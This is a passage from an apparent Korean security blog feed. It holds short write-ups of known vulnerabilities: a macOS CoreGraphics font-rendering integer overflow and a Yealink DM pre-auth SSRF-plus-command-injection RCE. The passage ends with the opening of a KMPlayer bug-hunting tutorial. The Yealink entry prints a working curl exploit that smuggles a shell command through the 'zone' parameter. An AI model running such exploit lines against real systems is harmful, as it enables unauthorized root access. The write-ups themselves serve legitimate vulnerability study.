&#xC720;&#xD6A8;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>vmware</tag>
      
      <tag>L0ch</tag>
      
      <tag>path traversal</tag>
      
      <tag>unrestricted file upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] macOS: Integer overflow in CoreGraphics leading to oob write</title>
    <link href="/2021/03/18/insu/2021-03-18/"/>
    <url>/2021/03/18/insu/2021-03-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2130">macOS: Integer overflow in CoreGraphics leading to out-of-bounds write when rendering fonts</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>CoreGraphics, Big Sur version 11.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>macOS CoreGraphics&#xC5D0;&#xC11C; &#xD3F0;&#xD2B8;&#xB97C; &#xB80C;&#xB354;&#xB9C1; &#xD560; &#xB54C; out-of-bound write&#xAC00; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; glyphs&#xB97C; bitmap&#xC73C;&#xB85C; &#xB80C;&#xB354;&#xB9C1; &#xD560; &#xB54C; CoreGraphics library&#xC758; &#xBC94;&#xC704; &#xAC80;&#xC99D; &#xBBF8;&#xD761;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. glyph bitmap&#xC744; &#xB80C;&#xB354;&#xB9C1; &#xD558;&#xAE30; &#xC704;&#xD55C; delta &#xAE30;&#xBC18;&#xC758; anti-aliasing &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; <code>2^30</code>&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xC88C;&#xD45C;&#xB9CC; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC774; &#xC88C;&#xD45C;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v96 &gt;&gt; <span class="hljs-number">12</span> == v94 &gt;&gt; <span class="hljs-number">12</span> )              {                v106 = v101 - v100;(<span class="hljs-number">1</span>)             v107 = (v96 + v94) &gt;&gt; <span class="hljs-number">13</span>;                v108 = v96 - v94;                <span class="hljs-keyword">if</span> ( v96 - v94 &lt; <span class="hljs-number">1</span> )                  v108 = v94 - v96;                <span class="hljs-keyword">if</span> ( v94 - v96 &gt; <span class="hljs-number">0</span> )                  LOWORD(v96) = v94;                v109 = (v106 * (v108 - ((<span class="hljs-number">2</span> * (<span class="hljs-keyword">unsigned</span> __int16)v96) &amp; <span class="hljs-number">0x1FFE</span>) + <span class="hljs-number">0x2000</span>)) &gt;&gt; <span class="hljs-number">13</span>;(<span class="hljs-number">2</span>)             *(_WORD *)(v86 + <span class="hljs-number">2</span> * v107) += v109;(<span class="hljs-number">3</span>)             *(_WORD *)(v86 + <span class="hljs-number">2</span> * v107 + <span class="hljs-number">2</span>) += v106 - v109;                v90 = v160;              }</code></pre><p>(1)&#xC5D0;&#xC11C; &#xB450; &#xC88C;&#xD45C;&#xC758; &#xC911;&#xAC04; &#xC9C0;&#xC810;&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xACE0; &#xC22B;&#xC790;&#xB85C; &#xBCC0;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; x &#xC88C;&#xD45C;&#xB294; &#xB458; &#xB2E4; <code>-2^30</code>&#xBCF4;&#xB2E4; &#xC791;&#xC73C;&#xBBC0;&#xB85C; &#xB450; &#xAC12;&#xC744; &#xB354;&#xD560; &#xACBD;&#xC6B0; integer overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC; &#xAC12;&#xC774; &#xD070; &#xC591;&#xC758; &#xC815;&#xC218;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; (2)&#xC640; (3)&#xC5D0;&#xC11C; oob write&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>insu</tag>
      
      <tag>cve</tag>
      
      <tag>mac</tag>
      
      <tag>oob</tag>
      
      <tag>coregraphics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Yealink DM Pre-Auth root level RCE</title>
    <link href="/2021/03/18/idioth/2021-03-18/"/>
    <url>/2021/03/18/idioth/2021-03-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-yealink-dm-pre-auth-root-level-rce/">SSD Advisory &#x2013; Yealink DM Pre Auth &#x2018;root&#x2019; level RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Yealink DM 3.6.0.20 &#xBC84;&#xC804; &#xC774;&#xD558;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD1B5;&#xD569; &#xAC1C;&#xBC1C; &#xBC0F; &#xBC30;&#xD3EC;, &#xC2E4;&#xC2DC;&#xAC04; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xBC0F; &#xACBD;&#xACE0;, &#xC6D0;&#xACA9; &#xBB38;&#xC81C; &#xD574;&#xACB0; &#xB4F1;&#xC758; &#xC194;&#xB8E8;&#xC158;&#xC744; &#xAC00;&#xC9C4; Yealink Device Management(&#xC774;&#xD558; Yealink DM) platform&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC6D0;&#xACA9; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC784;&#xC758; &#xBA85;&#xB839;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC740; pre-auth SSRF &#xCDE8;&#xC57D;&#xC810;&#xACFC; Command Injection &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCCB4;&#xC774;&#xB2DD; &#xD558;&#xC5EC; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;. SSRF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>/usr/local/yealink/dmweb/api/index.js</code> &#xCF54;&#xB4DC; &#xC77C;&#xBD80;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs javascript"> <span class="hljs-number">17</span> <span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">app</span> =&gt;</span> { <span class="hljs-number">18</span>     app.use(<span class="hljs-string">&apos;/premise&apos;</span>, router); <span class="hljs-number">19</span> };[...]<span class="hljs-number">217</span> router.get(<span class="hljs-string">&apos;/front/getPingData&apos;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {<span class="hljs-number">218</span>     <span class="hljs-comment">// res.send({&quot;ret&quot;:1,&quot;data&quot;:&quot;PING www.baidu.com (14.215.177.38): 56 data bytes\n64 bytes from 14.215.177.38: seq=0 ttl=54 time=15.084 ms\n64 bytes from 14.215.177.38: seq=1 ttl=54 time=15.888 ms\n64 bytes from 14.215.177.38: seq=2 ttl=54 time=15.742 ms\n64 bytes from 14.215.177.38: seq=3 ttl=54 time=15.622         ms\n64 bytes from 14.215.177.38: seq=4 ttl=54 time=16.384 ms\n\n--- www.baidu.com ping statistics ---\n5 packets transmitted, 5 packets received, 0% packet loss\nround-trip min/avg/max = 15.084/15.744/16.384 ms\n&quot;,&quot;error&quot;:null})</span><span class="hljs-number">219</span>     <span class="hljs-comment">// return;</span><span class="hljs-number">220</span>     <span class="hljs-keyword">try</span> {<span class="hljs-number">221</span>         <span class="hljs-keyword">let</span> url = req.query.url;<span class="hljs-number">222</span>         <span class="hljs-comment">// &#xFFFD;&#xFFFD;telnet&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;pos&#xFFFD;&#xFFFD;&#xFFFD;ping&#xFFFD;trace&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#x7AEF;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;pos&#xFFFD;&#xFFFD;&#x4EE5;&#xFFFD;&#x5E76;&#xFFFD;pos&#x4F20;&#xFFFD;&#xFFFD;</span><span class="hljs-number">223</span>         <span class="hljs-keyword">let</span> pos = req.query.pos;<span class="hljs-number">224</span>         <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`url===<span class="hljs-subst">${url}</span>`</span>);<span class="hljs-number">225</span>         <span class="hljs-keyword">let</span> headers = {<span class="hljs-number">226</span>             <span class="hljs-string">&apos;Content-Type&apos;</span>: <span class="hljs-string">&apos;application/json&apos;</span>,<span class="hljs-number">227</span>             <span class="hljs-string">&apos;User-Agent&apos;</span>: req.headers[<span class="hljs-string">&apos;user-agent&apos;</span>],<span class="hljs-number">228</span>             <span class="hljs-string">&apos;x-forwarded-for&apos;</span>: commom.getClientIP(req),<span class="hljs-number">229</span>             token: req.session.token<span class="hljs-number">230</span>         };<span class="hljs-number">231</span>         request.get({<span class="hljs-number">232</span>             url: url,<span class="hljs-number">233</span>             headers: headers,<span class="hljs-number">234</span>             timeout: <span class="hljs-number">60000</span>,<span class="hljs-number">235</span>             qs: {<span class="hljs-number">236</span>                 pos: pos<span class="hljs-number">237</span>             }<span class="hljs-number">238</span>         }).pipe(res);<span class="hljs-number">239</span>     } <span class="hljs-keyword">catch</span> (e) {<span class="hljs-number">240</span>         <span class="hljs-built_in">console</span>.error(e);<span class="hljs-number">241</span>         res.send(<span class="hljs-number">242</span>             errcode.MakeResult(<span class="hljs-number">243</span>                 errcode.ERR,<span class="hljs-number">244</span>                 e,<span class="hljs-number">245</span>                 errcode.INTERNAL_ERROR,<span class="hljs-number">246</span>                 <span class="hljs-string">&apos;server.common.internal.error&apos;</span><span class="hljs-number">247</span>             )<span class="hljs-number">248</span>         );<span class="hljs-number">249</span>     }<span class="hljs-number">250</span> });</code></pre><p>17&#xBC88; &#xC904;&#xC5D0;&#xC11C; &#xCD94;&#xAC00;&#xC801;&#xC778; API &#xC0AC;&#xC6A9;&#xC744; &#xC704;&#xD574; <code>/premise</code> route&#xB97C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; 217&#xBC88; &#xC904;&#xC5D0;&#xC11C; <code>/premise/front/getPingData</code>&#xB97C; GET &#xBA54;&#xC18C;&#xB4DC;&#xC758; route&#xB85C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. 232&#xBC88; &#xC904;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xD5E4;&#xB354;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; URL&#xC744; GET &#xBA54;&#xC18C;&#xB4DC;&#xB85C; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD5E4;&#xB354;&#xB294; 225&#xC904;&#xC5D0;&#xC11C; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xD574;&#xB2F9; &#xD5E4;&#xB354; &#xAC12;&#xC73C;&#xB85C; URL&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xD574;&#xCEE4;&#xAC00; &#xC81C;&#xC5B4;&#xD558;&#xB294; URL&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; <code>0.0.0.0:9600/tcp</code>&#xC5D0;&#xC11C; root&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; <code>smserver</code> &#xB370;&#xBAAC;&#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. <code>smserver</code>&#xC758; <code>mod_firewall.so</code> &#xBAA8;&#xB4C8;&#xC5D0;&#xB294; Command injection&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; <code>fw_restful_service_get()</code> &#xD568;&#xC218;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; <code>zone=</code>&#xC5D0; &#xB4E4;&#xC5B4;&#xC628; GET &#xBCC0;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; SSRF&#xB97C; &#xD1B5;&#xD574; <code>smserver</code>&#xC5D0; payload&#xB97C; &#xC791;&#xC131;&#xD558;&#xC5EC; &#xBCF4;&#xB0B4;&#xBA74; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; Remote  Code Execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs asciidoc">curl --insecure &quot;<span class="hljs-link">https://</span>[<span class="hljs-string">target</span>]/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;&quot;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>pre-auth</tag>
      
      <tag>yealink</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 버그헌팅 튜토리얼 Part 2</title>
    <link href="/2021/03/17/l0ch/bughunting-tutorials-part2/"/>
    <url>/2021/03/17/l0ch/bughunting-tutorials-part2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 1</a></p><p>&#xC9C0;&#xB09C; Part 1&#xC5D0; &#xC774;&#xC5B4; &#xD0C0;&#xAE43; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC120;&#xC815;&#xACFC; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xD30C;&#xC77C; &#xD3EC;&#xB9F7;&#xC744; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h1 id="&#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0;-KMPlayer"><a href="#&#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0;-KMPlayer" class="headerlink" title="&#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0; - KMPlayer"></a>&#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0; - KMPlayer</h1><p>&#xC81C;&#xAC00; &#xC608;&#xC2DC;&#xB85C; &#xB4E4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; KMPlayer&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB4E4; KMPlayer &#xC544;&#xC2DC;&#xC8E0;?? &#xC4F0;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xB3C4; &#xC788;&#xC744; &#xAC70;&#xACE0;</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image0.jpg" alt></p><blockquote><p>&#xCD9C;&#xCC98; : &#xB124;&#xC774;&#xBC84; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC790;&#xB8CC;&#xC2E4;</p></blockquote><p>KMPlayer&#xC758; &#xACBD;&#xC6B0; &#xC6D0;&#xB798;&#xB294; &#xB3D9;&#xC601;&#xC0C1; &#xD50C;&#xB808;&#xC774;&#xC5B4;&#xC774;&#xC9C0;&#xB9CC; &#xC74C;&#xC545;&#xB3C4; &#xD50C;&#xB808;&#xC774;&#xD574;&#xC8FC;&#xACE0; &#xC0AC;&#xC9C4;&#xB3C4; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC81C;&#xAC00; &#xCC3E;&#xC558;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC0AC;&#xC9C4; &#xD3EC;&#xB9F7; &#xC911; &#xD558;&#xB098;&#xC778; .dib &#xD3EC;&#xB9F7;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; &#xD799; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC62C;&#xD574;(2017&#xB144;) 4 &#xC6D4;&#xC778;&#xAC00; &#xC81C;&#xBCF4;&#xD558;&#xACE0; 7 &#xC6D4;&#xC5D0; &#xD328;&#xCE58;&#xAC00; &#xB418;&#xC5C8;&#xB124;&#xC694;.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image1.png" alt></p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC124;&#xBA85;&#xC744; &#xD558;&#xB294; &#xC774;&#xC720;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>dib &#xD3EC;&#xB9F7;&#xC740; &#xC555;&#xCD95;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xADF8;&#xB0E5; &#xBE44;&#xD2B8;&#xB9F5; &#xC815;&#xBCF4;&#xB97C; raw &#xD558;&#xAC8C; &#xC800;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBD84;&#xC11D;&#xC744; &#xD560; &#xB54C;&#xB098; &#xC775;&#xC2A4;&#xB97C; &#xD560; &#xB54C;&#xB098; &#xC544;&#xC8FC; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC785;&#xBB38;&#xC790;&#xBD84;&#xB4E4;&#xC774; &#xCC98;&#xC74C; &#xACF5;&#xBD80;&#xB97C; &#xD560; &#xB54C; &#xB9E4;&#xC6B0; &#xC27D;&#xAC8C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xBD84;&#xC11D;&#xD560; &#xCF54;&#xB4DC; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0;&#xAC00; &#xC791;&#xACE0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xB2E8;&#xC21C;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBBA4;&#xD14C;&#xC774;&#xD2B8; &#xD574;&#xC57C; &#xD560; &#xBC14;&#xC774;&#xD2B8;&#xB3C4; &#xC801;&#xACE0;&#xC694;. &#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xC26C;&#xC6CC;&#xC11C;??</li><li>KMPlayer&#xB294; &#xC608;&#xC804; &#xBC84;&#xC804;&#xC744; &#xB2E4;&#xC6B4; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB978; &#xAC74; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC544;&#xB3C4; &#xD658;&#xACBD; &#xAD6C;&#xC131;&#xC774; &#xC548;&#xB418;&#xBA74; &#xC774;&#xB7F0; &#xAE00;&#xC744; &#xC4F8; &#xC218;&#xAC00; &#xC5C6;&#xC5B4;&#xC694; &#x3160;&#x3160; </li></ol><p>&#xADF8;&#xB798;&#xC11C; &#xC774;&#xC81C; &#xC2DC;&#xC791;&#xD574;&#xBCF4;&#xC8E0; &#x314B;&#x314B;&#x314B; &#xC77C;&#xB2E8; &#xBA3C;&#xC800; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xBC84;&#xC804;&#xC744; &#xB2E4;&#xC6B4; &#xBC1B;&#xC544; &#xBCF4;&#xC8E0;.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image2.png" alt></p><p>&#xC81C;&#xAC00; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC9C4;&#xD589;&#xD588;&#xB358; &#xBC84;&#xC804;&#xC740; 4.1.5.8&#xC785;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC2E4; 4.2.1.4 &#xC774;&#xC804; &#xBC84;&#xC804; &#xC544;&#xBB34;&#xAC70;&#xB098; &#xB2E4;&#xC6B4; &#xBC1B;&#xC73C;&#xC154;&#xB3C4; &#xB418;&#xB294; &#xB370; &#xC81C;&#xAC00; &#xCC3E;&#xC544; &#xB193;&#xC740; &#xAC00;&#xC82F;&#xC774;&#xB098; &#xC815;&#xBCF4;&#xB4E4;&#xC774; &#xB2E4; &#xC800; &#xBC84;&#xC804;&#xC774;&#xC5B4;&#xC11C; &#xC775;&#xC2A4; &#xB2E4;&#xC2DC; &#xC9DC;&#xAE30; &#xADC0;&#xCC2E;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xADF8;&#xB0E5; &#xC774; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xC81C; &#xC2DC;&#xB4DC; &#xD30C;&#xC77C;&#xC744; &#xB9CC;&#xB4E4; &#xAC74;&#xB370; &#xB9CC;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xB72F;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; dib &#xD30C;&#xC77C; &#xD3EC;&#xB9F7;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xAC04;&#xB2E8;&#xD788; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;. </p><p>&#xC55E;&#xC11C; &#xB9D0;&#xD588;&#xB2E4;&#xC2DC;&#xD53C; dib &#xD3EC;&#xB9F7;&#xC740; &#xBB34;&#xC555;&#xCD95; &#xBE44;&#xD2B8;&#xB9F5; &#xC774;&#xBBF8;&#xC9C0; &#xD3EC;&#xB9F7;&#xC785;&#xB2C8;&#xB2E4;. &#xAD6C;&#xC870;&#xAC00; &#xB9E4;&#xC6B0; &#xAC04;&#xB2E8;&#xD558;&#xACE0; &#xBE44;&#xD2B8;&#xB9F5; &#xC815;&#xBCF4;&#xB4E4;&#xC774; &#xC5B4;&#xB5A0;&#xD55C; &#xAC00;&#xACF5;&#xB3C4; &#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xBC14;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC8E0;. (&#xC555;&#xCD95;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xC788;&#xAE30;&#xB294; &#xD574;&#xC694; &#xD558;&#xC9C0;&#xB9CC; &#xADF8;&#xB0E5; &#xB118;&#xC5B4;&#xAC08;&#xAC8C;&#xC5EC;) </p><p>&#xD3EC;&#xB9F7;&#xC740; &#xB450; &#xAC1C;&#xC758; &#xAD6C;&#xC870;&#xCCB4;&#xC640; &#xBE44;&#xD2B8;&#xB9F5; &#xC815;&#xBCF4;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xD30C;&#xC77C;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCFC;&#xAC8C;&#xC694;. &#xAC1C;&#xAFC0;&#xC778; &#xAC8C; &#xC708;&#xB3C4;&#xC6B0;&#xC5D0; &#xAE30;&#xBCF8;&#xC73C;&#xB85C; &#xC788;&#xB294; &#xADF8;&#xB9BC;&#xD310;&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; dib &#xD30C;&#xC77C;&#xC744; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image3.png" alt></p><p>&#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; 24 &#xBE44;&#xD2B8; &#xBE44;&#xD2B8;&#xB9F5;&#xC758; dib &#xD3EC;&#xB9F7;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;. 24 &#xBE44;&#xD2B8;&#xC778; &#xC774;&#xC720;&#xB294; RGB&#xB97C; &#xD45C;&#xD604;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xD55C; &#xD53D;&#xC140;&#xC744; &#xD45C;&#xD604;&#xD558;&#xB294; &#xB370; 3 &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; &#xBA3C;&#xC800; &#xC800;&#xC7A5;&#xC744; &#xD558;&#xACE0; &#xC544;&#xBB34; &#xC0C9;&#xC774;&#xB098; &#xB123;&#xC5B4;&#xBCFC;&#xAC8C;&#xC694;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#xC800;&#xC7A5;&#xD558;&#xACE0; hxd&#xB85C; &#xBD05;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; &#xADF8;&#xB0E5; &#xD68C;&#xC0C9;&#xC73C;&#xB85C; &#xCE60;&#xD574;&#xBCF4;&#xC558;&#xB294; &#xB370; &#xD5E5;&#xC2A4;&#xB85C; &#xBCF4;&#xB2C8;&#xAE4C; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xB098;&#xC624;&#xB124;&#xC694;.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image4.jpg" alt></p><p>&#xC74C; &#xB531; &#xBD10;&#xB3C4; &#xC704;&#xC5D0; &#xBE68;&#xAC04; &#xBD80;&#xBD84;&#xC774; &#xD5E4;&#xB354; &#xC815;&#xBCF4;&#xC774;&#xACE0; &#xB4A4;&#xC5D0;&#xC11C; &#xBE44;&#xD2B8;&#xB9F5; &#xC815;&#xBCF4;&#xC778; &#xAC70; &#xAC19;&#xC8E0;?? &#xC774;&#xB807;&#xAC8C;<br>&#xAC04;&#xB2E8;&#xD55C; &#xD3EC;&#xB9F7; &#xCC98;&#xC74C; &#xBCF4;&#xB294; &#xAC70; &#xAC19;&#xC8E0;?? &#x3147;&#x3148;? &#x3147;&#x3147;&#x3148;</p><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xBE68;&#xAC04;&#xC0C9; &#xBC15;&#xC2A4; &#xBD80;&#xBD84;&#xC758; &#xC815;&#xBCF4;&#xAC00; &#xBB54;&#xC9C0; &#xAC04;&#xB2E8;&#xD558;&#xAC8C;&#xB9CC; &#xC54C;&#xC544;&#xBCFC;&#xAC8C;&#xC694;. &#xCC38;&#xACE0;&#xB85C; &#xB2E4;&#xB978; &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xD560; &#xB54C;&#xC5D0;&#xB3C4; &#xD3EC;&#xB9F7;&#xC744; &#xC54C;&#xACE0; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xAC8C; &#xC880; &#xB354; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC9C4;&#xD589;&#xD560; &#xB54C;&#xC5D0;&#xB294; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC774; 